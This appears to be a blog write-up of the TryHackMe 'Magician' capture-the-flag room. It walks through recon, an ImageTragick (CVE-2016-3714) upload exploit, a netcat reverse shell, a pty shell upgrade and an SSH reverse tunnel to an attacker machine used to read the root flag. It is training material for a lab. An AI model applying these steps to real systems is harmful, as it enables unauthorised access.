---
weight: 3
title: "My First CTF writeup"
date: 2021-03-03T21:57:40+08:00
lastmod: 2021-03-04T16:45:40+08:00
description: "This is my first TryHackMe writeup"

title: My first CTF writeup
featuredImage: tryhackmebanner.jpg
hiddenfeaturedImage: true

tags: ["TryHackMe", "CTF"]
categories: ["Writeups"]

lightgallery: false
summary: TryHackMe's CTF __"Magician"__. Joining this room on the TryHackMe platform, it tells us that this box is apparently a webserver that hosts a vulnerable website which lets you convert image file formats.
---

# {{< figure src="/magician/banner.jpg" title="This magical website lets you convert image file formats" >}}

## Summary

1. Recon with nmap & Enumerate the services. FTP on port 21, HTTP-Proxy on port 8080 and HTTP on port 8081.

2. The HTTP service on port 8081 allows image upload and exploiting the “ImageTragick” vulnerability . 

3. Initial foothold by exploiting ImageTragick Remote Code Execution (CVE-2016-3714).

4. Upload the payload, spawn a shell and get our first user flag.

5. Linux enumeration reveals that port 6666 (Magic Cat Listener) is listening on target localhost.

6. We create a tunnel with ssh, and proxy our traffic through port 6666 on our Kali machine which lets us talk to the localhost service on the victim machine.

7. The local service allows for LFI, which lets us read root.txt and get our last flag.

## Scanning

We start with our standard nmap scan:

{{< figure src="/magician/nmap.jpg" title="" >}}

There is an FTP server running on port 21 and a couple of web services on ports 8080 and 8081.
Nmap does not tell us anything about anonymous login, and I could confirm this with a manual test.

## Enumeration

Let's go ahead and visit port 8080:

{{< figure src="/magician/error.jpg" title="" >}}

An error message that does not give us much, however it tells us that its running an application that is Java based. A quick google search on the error message suggests
that it's an open source app called “Spring" which is a framework for the Java platform.

Let's run GoBuster in directory enumeration mode to see if there may be anything of interest here.
   
{{< figure src="/magician/gobuster.jpg" title="" >}}

Interesting, there are some directories here. When we go to the /files directory we can see this:

{{< figure src="/magician/dir_listing.jpg" title="" >}}

It looks like a listing, perhaps of the files uploaded through an upload form.

Navigating to the web service on port 8081 we are greeted with a page that allows us to **upload images**:

{{< figure src="/magician/uploadform.jpg" title="" >}}

After uploading a .png file I found the image file just like I thought; in the **directory listing** on http://magician:8080/files

{{< figure src="/magician/pingu.jpg" title="" >}}

Perhaps we can exploit this and get a shell on the webserver?

We can take a look at the web request with Burp to find out more.

{{< figure src="/magician/burp.jpg" title="" >}}

We can see here that theres a **POST** request to the webapp on port 8080.
Probably the back-end app does the conversion from .PNG to .JPG before it gets saved to the /files directory.
This reminds me of the “Image Tragick” exploit where web services used the program ImageMagick to process images.
One of the vulnerabilities could lead to remote code execution (RCE). _CVE-2016–3714._

Lets try and see if my theory is right.

## Gaining access

#### PayloadsALLTheThings got us covered. 
We download the payload **“imagetragik1_payload_url_curl.png” and “imagetragik1_payload_imageover_reverse_shell_netcat_fifo.png"** .

From https://github.com/swisskyrepo/PayloadsAllTheThings

I change the IP address in the payload to my Kali machine and upload the “imagetragik1_payload_url_curl.png” just to check if the vulnerability is present.
Before I browse to the uploaded file and execute the payload, I start my netcat listener:

{{< figure src="/magician/imgtragik_test.jpg" title="" >}}

Yes! We see that it is working and we get a curl request from the victim machine!
Now that we have confirmed that the exploit works, we can do the same to get a reverse shell.

Using the payload **“imagetragik1_payload_imageover_reverse_shell_netcat_fifo.png”** and inserting our Kali machine IP in the payload, we upload the file.
Again, before executing it we start our netcat listener.

{{< figure src="/magician/nc_shell.jpg" title="" >}}

Our reverse netcat session is successful!

We can see that we got a low-privilege user shell. 
The first thing I usually do is to upgrade this crude shell to an interactive shell in 3 steps:



1. The first thing to do is use python3 -c 'import pty;pty.spawn("/bin/bash")' ', which uses Python to spawn a better-featured bash shell. At this point, our shell will look a bit prettier, but we still won’t be able to use tab autocomplete or the arrow keys, and Ctrl + C will still kill the shell.
 
2. Step two is:
 export TERM=xterm – this will give us access to term commands such as clear.

     
3. Finally (and most importantly) we will background the shell using Ctrl + Z. Back in our own terminal we use stty raw -echo; fg.This does two things: first, it turns off our own terminal echo (which gives us access to tab autocompletes, the arrow keys, and Ctrl + C to kill processes). It then foregrounds the shell, thus completing the process.
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
^Z
stty raw -echo; fg
```
{{< figure src="/magician/pty_upgrade.jpg" title="" >}}

With that out of the way, let's find the **first** flag! 
We CD into our user “magician” home directory, list the files and cat out the contents of user.txt:
{{< figure src="/magician/1stflag.jpg" title="" >}}
Our next step is to do some more enumeration to become root or find the root flag.

## Privilege Escalation

Theres another interesting file in magician's home directory **“the_magic_continues”**.
Lets take a look at it...


{{< figure src="/magician/enumerate1.jpg" title="Locally listening cat" >}}

The words that stand out to me is “locally listening cat”. I suspect that theres a service listening on a localhost port.
Running _netstat -plunt_ confirms this.

{{< figure src="/magician/listeningservice.jpg" title="" >}}

Port 6666 on localhost looks interesting. To access this we need to port forward and use a tunnel connection back to our Kali host. There are many ways to create a tunnel, and for
this I will use the SSH method.

On our Kali machine:
```bash
sudo service ssh start
```
On our victim machine:
```bash
ssh -R 6666:localhost:6666 kali@10.14.6.6
```
{{< figure src="/magician/sshtunnel.jpg" title="" >}}

Now we should see that we have a service on port 6666 listening on our Kali machine and we have established the tunnel.
{{< figure src="/magician/sshtunnel2.jpg" title="" >}}

What we need to do now is just proxy our webtraffic through the 6666 port on our Kali machine and it will send a HTTP GET request to the service that is listening locally on the “magician” box.

For this I use FoxyProxy:

{{< figure src="/magician/foxyproxy.jpg" title="" >}}
And head on over to http://localhost to reach the service that is listening on the victim machine localhost:6666.
{{< figure src="/magician/magiccatservice.jpg" title="The Magic Cat" >}}

What do we have here? Looks like we can run commands. Lets try and get the **root** flag!
{{< figure src="/magician/commands.jpg" title="" >}}

Looks like its encoded in HEX. We use CyberChef to decode it.

{{< figure src="/magician/cyberchef.jpg" title="" >}}

And we submit the root flag to complete the room!
We could probably try to get a root shell as well, but this is out of the scope in this room.

## Conclusion

This was a fun and easy beginners room. I have never actually used the ImageTragick exploit before in any previous CTFs. It was a cool little trick and something I will definitely take note of and keep in the back of my head for future encounters!